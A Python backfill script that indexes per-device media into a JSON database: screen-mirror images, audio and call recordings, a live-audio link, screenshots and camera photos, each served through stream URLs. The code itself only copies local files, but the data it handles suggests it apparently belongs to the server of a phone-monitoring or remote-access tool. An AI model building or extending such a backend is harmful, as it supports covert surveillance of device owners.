import os
import time
import json
import shutil

DB_FILE = 'database.json'

def backfill():
    if not os.path.exists(DB_FILE):
        print(f"Database file {DB_FILE} not found.")
        return

    with open(DB_FILE, 'r', encoding='utf-8') as f:
        db = json.load(f)

    now_ms = int(time.time() * 1000)
    devices = set(list(db.keys()))

    # Also discover any device directories in data/ and media/
    for base in ['data', 'media']:
        if os.path.exists(base):
            for entry in os.listdir(base):
                if os.path.isdir(os.path.join(base, entry)) and not entry.startswith('.'):
                    devices.add(entry)

    for device_id in devices:
        if device_id not in db:
            db[device_id] = {"_id": device_id}
        
        dev = db[device_id]
        if "media" not in dev or not isinstance(dev["media"], dict):
            dev["media"] = {}

        data_dir = os.path.join("data", device_id)
        media_dir = os.path.join("media", device_id)
        voice_dir = os.path.join(media_dir, "voice")
        photos_dir = os.path.join(media_dir, "photos")

        os.makedirs(media_dir, exist_ok=True)
        os.makedirs(voice_dir, exist_ok=True)
        os.makedirs(photos_dir, exist_ok=True)

        # 1. Backfill Mirror Images
        mirror_files = []
        if os.path.exists(data_dir):
            for fn in os.listdir(data_dir):
                if fn.lower().startswith("mirror") and fn.lower().endswith((".jpg", ".jpeg", ".png")):
                    mirror_files.append(os.path.join(data_dir, fn))
        if os.path.exists(media_dir):
            for fn in os.listdir(media_dir):
                if fn.lower().startswith("mirror") and fn.lower().endswith((".jpg", ".jpeg", ".png")):
                    mirror_files.append(os.path.join(media_dir, fn))

        if mirror_files:
            mirror_files.sort(key=lambda p: os.path.getmtime(p), reverse=True)
            latest_mirror = mirror_files[0]
            dest_mirror = os.path.join(media_dir, "mirror.jpg")
            if os.path.abspath(latest_mirror) != os.path.abspath(dest_mirror):
                shutil.copyfile(latest_mirror, dest_mirror)
            m_time = int(os.path.getmtime(dest_mirror) * 1000)
            dev["mirror_url"] = f"/api/media/stream/{device_id}/mirror.jpg?t={m_time}"
            dev["mirror_time"] = m_time
            print(f"[{device_id}] Backfilled mirror image from {latest_mirror}")

        # 2. Backfill Audio Recordings
        audio_files = []
        for sdir in [voice_dir, data_dir, media_dir]:
            if os.path.exists(sdir):
                for fn in os.listdir(sdir):
                    fp = os.path.join(sdir, fn)
                    if os.path.isfile(fp) and (fn.lower().startswith("audio_") or fn.lower().endswith((".mp3", ".wav", ".m4a", ".ogg"))):
                        audio_files.append((fn, fp))

        for fn, fp in audio_files:
            target_voice = os.path.join(voice_dir, fn)
            target_direct = os.path.join(media_dir, fn)
            if not os.path.exists(target_voice):
                shutil.copyfile(fp, target_voice)
            if not os.path.exists(target_direct):
                shutil.copyfile(fp, target_direct)

            m_time = int(os.path.getmtime(fp) * 1000)
            file_size = os.path.getsize(fp)
            fb_key = f"m_{m_time}_{fn.split('.')[0]}"
            m_type = "call_recording" if "call" in fn.lower() else "audio"

            dev["media"][fb_key] = {
                "time": m_time,
                "url": f"/api/media/stream/{device_id}/{fn}",
                "name": fn,
                "type": m_type,
                "bytes": file_size,
                "duration": 15
            }

        if audio_files:
            audio_files.sort(key=lambda item: os.path.getmtime(item[1]), reverse=True)
            latest_audio_fn, latest_audio_fp = audio_files[0]
            dev["live_audio_url"] = f"/api/media/stream/{device_id}/{latest_audio_fn}"
            dev["live_audio_time"] = int(os.path.getmtime(latest_audio_fp) * 1000)
            print(f"[{device_id}] Backfilled {len(audio_files)} audio recordings.")

        # 3. Backfill Screenshots
        ss_files = []
        for sdir in [data_dir, media_dir, photos_dir]:
            if os.path.exists(sdir):
                for fn in os.listdir(sdir):
                    fp = os.path.join(sdir, fn)
                    if os.path.isfile(fp) and (fn.lower().startswith("screenshot") or fn.lower().startswith("ss_")):
                        ss_files.append((fn, fp))

        for fn, fp in ss_files:
            target_photo = os.path.join(photos_dir, fn)
            target_direct = os.path.join(media_dir, fn)
            if not os.path.exists(target_photo):
                shutil.copyfile(fp, target_photo)
            if not os.path.exists(target_direct):
                shutil.copyfile(fp, target_direct)

            m_time = int(os.path.getmtime(fp) * 1000)
            fb_key = f"m_{m_time}_{fn.split('.')[0]}"
            dev["media"][fb_key] = {
                "time": m_time,
                "url": f"/api/media/stream/{device_id}/{fn}",
                "name": fn,
                "type": "screenshot",
                "bytes": os.path.getsize(fp)
            }
        if ss_files:
            print(f"[{device_id}] Backfilled {len(ss_files)} screenshots.")

        # 4. Backfill Photos / Images
        img_files = []
        for sdir in [data_dir, media_dir, photos_dir]:
            if os.path.exists(sdir):
                for fn in os.listdir(sdir):
                    fp = os.path.join(sdir, fn)
                    if os.path.isfile(fp) and (fn.lower().startswith("img_") or fn.lower().startswith("cam_")):
                        img_files.append((fn, fp))

        for fn, fp in img_files:
            target_photo = os.path.join(photos_dir, fn)
            target_direct = os.path.join(media_dir, fn)
            if not os.path.exists(target_photo):
                shutil.copyfile(fp, target_photo)
            if not os.path.exists(target_direct):
                shutil.copyfile(fp, target_direct)

            m_time = int(os.path.getmtime(fp) * 1000)
            fb_key = f"m_{m_time}_{fn.split('.')[0]}"
            dev["media"][fb_key] = {
                "time": m_time,
                "url": f"/api/media/stream/{device_id}/{fn}",
                "name": fn,
                "type": "image",
                "bytes": os.path.getsize(fp)
            }
        if img_files:
            print(f"[{device_id}] Backfilled {len(img_files)} camera photos.")

        # Ensure only dict items remain in media
        dev["media"] = {k: v for k, v in dev["media"].items() if isinstance(v, dict)}

    with open(DB_FILE, 'w', encoding='utf-8') as f:
        json.dump(db, f, indent=2)

    print("Backfill completed successfully.")

if __name__ == '__main__':
    backfill()
